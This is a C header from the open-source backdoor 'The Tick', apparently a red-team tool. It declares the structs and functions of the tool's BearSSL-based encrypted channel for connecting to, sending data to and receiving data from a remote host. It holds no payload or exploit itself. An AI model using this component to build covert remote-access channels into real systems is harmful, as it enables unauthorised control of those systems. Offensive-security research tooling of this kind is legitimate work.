/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#ifndef SSL_H
#define SSL_H

#include <sys/types.h>

#ifdef _WIN32
#include <winsock2.h>
#else
#include <sys/socket.h>
#endif

#include "bearssl.h"

typedef struct {
  const br_x509_class *vtable;
  br_x509_minimal_context minimal;
  int verifyhost;
  int verifypeer;
} x509_context;

typedef struct {
    br_ssl_client_context sc;
    x509_context xc;
    br_sslio_context ioc;
    unsigned char iobuf[BR_SSL_BUFSIZE_BIDI];
} SSL_Context;

int ssl_connect_to_host(SSL_Context *ssl, int *out_fd, const char *hostname, int port);
int ssl_send_block(SSL_Context *ssl, const char *buf, size_t count);
int ssl_recv_block(SSL_Context *ssl, char *buf, size_t count);
int ssl_consume_extra_data(SSL_Context *ssl, size_t count);
void disconnect_ssl(SSL_Context *ssl);

#endif /* SSL_H */
